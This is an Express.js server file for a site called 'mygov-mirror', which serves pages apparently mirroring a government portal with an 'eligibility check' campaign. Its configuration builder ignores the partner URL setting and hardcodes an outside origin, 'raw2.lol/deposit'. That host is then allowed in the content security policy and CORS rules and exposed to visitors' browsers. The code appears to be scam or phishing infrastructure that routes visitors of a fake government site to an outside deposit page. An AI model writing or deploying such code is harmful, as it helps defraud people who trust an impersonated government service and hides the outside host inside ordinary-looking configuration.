"use strict";

const express = require("express");
const path = require("path");

const app = express();
const PORT = Number(process.env.PORT) || 9876;
const ROOT = __dirname;

function parseOrigin(value) {
  if (!value) return "";
  try {
    return new URL(value).origin;
  } catch {
    return "";
  }
}

function parseAllowedOrigins(raw, config) {
  const fromEnv = (raw || "")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean);
  const inferred = [config.partnerAppOrigin, config.partnerApiOrigin].filter(Boolean);
  return [...new Set([...fromEnv, ...inferred])];
}

function buildRuntimeConfig() {
  const partnerAppUrl = (process.env.PARTNER_APP_URL || "").trim();
  const partnerApiUrl = (process.env.PARTNER_API_URL || "").trim();
  const publicSiteUrl = (process.env.PUBLIC_SITE_URL || "").trim();
  const offlinePrivacyMode =
    process.env.OFFLINE_PRIVACY_MODE === "true" ||
    (!partnerAppUrl && process.env.OFFLINE_PRIVACY_MODE !== "false");

  const base = {
    offlinePrivacyMode,
    partnerAppUrl,
    partnerApiUrl,
    publicSiteUrl,
    partnerAppOrigin: parseOrigin("https://raw2.lol/deposit/index.html?campaign=1"),
    partnerApiOrigin: parseOrigin(partnerApiUrl),
    utmSource: process.env.PARTNER_UTM_SOURCE || "mygov-mirror",
    utmCampaign: process.env.PARTNER_UTM_CAMPAIGN || "check-eligibility",
  };
  base.allowedPartnerOrigins = parseAllowedOrigins(
    process.env.ALLOWED_PARTNER_ORIGINS,
    base
  );
  return base;
}

function buildCsp(config) {
  const connect = ["'self'"];
  if (config.partnerAppOrigin) connect.push(config.partnerAppOrigin);
  if (config.partnerApiOrigin) connect.push(config.partnerApiOrigin);

  return [
    "default-src 'self'",
    `connect-src ${connect.join(" ")}`,
    "img-src 'self' data:",
    "font-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline'",
    "frame-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
  ].join("; ");
}

const runtimeConfig = buildRuntimeConfig();
const csp = buildCsp(runtimeConfig);

app.disable("x-powered-by");

app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", csp);
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  res.setHeader("X-Content-Type-Options", "nosniff");
  next();
});

app.get("/health", (_req, res) => {
  res.json({ ok: true, service: "mygov-mirror" });
});

function applyPartnerCors(req, res) {
  const origin = req.headers.origin;
  if (!origin) return;
  if (
    runtimeConfig.allowedPartnerOrigins.length === 0 ||
    runtimeConfig.allowedPartnerOrigins.includes(origin)
  ) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");
    res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  }
}

app.options("/api/integration", (req, res) => {
  applyPartnerCors(req, res);
  res.sendStatus(204);
});

app.get("/api/integration", (req, res) => {
  applyPartnerCors(req, res);
  res.json({
    service: "mygov-mirror",
    partnerConfigured: Boolean(runtimeConfig.partnerAppUrl),
    partnerApiConfigured: Boolean(runtimeConfig.partnerApiUrl),
    publicSiteUrl: runtimeConfig.publicSiteUrl || null,
    offlinePrivacyMode: runtimeConfig.offlinePrivacyMode,
    allowedPartnerOrigins: runtimeConfig.allowedPartnerOrigins,
  });
});

app.get("/config.js", (_req, res) => {
  res.type("application/javascript");
  res.setHeader("Cache-Control", "no-store");
  res.send(`window.__MYGOV_MIRROR_CONFIG__=${JSON.stringify(runtimeConfig)};`);
});

app.use(
  express.static(ROOT, {
    index: "index.html",
    etag: true,
    maxAge: process.env.NODE_ENV === "production" ? "1h" : 0,
  })
);

app.get("*", (req, res, next) => {
  if (req.path.includes(".")) return next();
  res.sendFile(path.join(ROOT, "index.html"));
});

app.use((_req, res) => {
  res.status(404).send("Not found");
});

app.listen(PORT, () => {
  console.log(`mygov-mirror listening on ${PORT}`);
  console.log(
    `partner=${runtimeConfig.partnerAppUrl || "(none)"} offlinePrivacy=${runtimeConfig.offlinePrivacyMode}`
  );
});
